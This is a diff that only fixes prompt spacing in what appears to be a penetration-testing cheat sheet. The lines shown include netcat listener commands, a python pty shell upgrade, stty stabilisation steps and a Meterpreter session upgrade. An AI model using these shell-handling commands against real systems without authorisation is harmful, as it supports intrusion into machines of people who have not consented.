@@ -56,7 +56,7 @@ $ tcpdump -i <interface> icmp
 
 + <b>Netcat - Listener</b>
 ```console
-$nc -nvlp 4242
+$ nc -nvlp 4242
 ```
 
 + <b>Netcat - Connecting to Listener</b>
@@ -98,13 +98,13 @@ sessions -u 1
 *Upgrading:*
 ```console
 python -c ‘import pty;pty.spawn(“/bin/bash”)’
-$export TERM=xterm
+$ export TERM=xterm
 ```
 
 *Stablizing:*
 ```console
-$^Z
-$stty raw -echo; fg
+$ ^Z
+$ stty raw -echo; fg
 (ENTER)
 ```
 ## Post-Meterpreter Shell To-Do's:
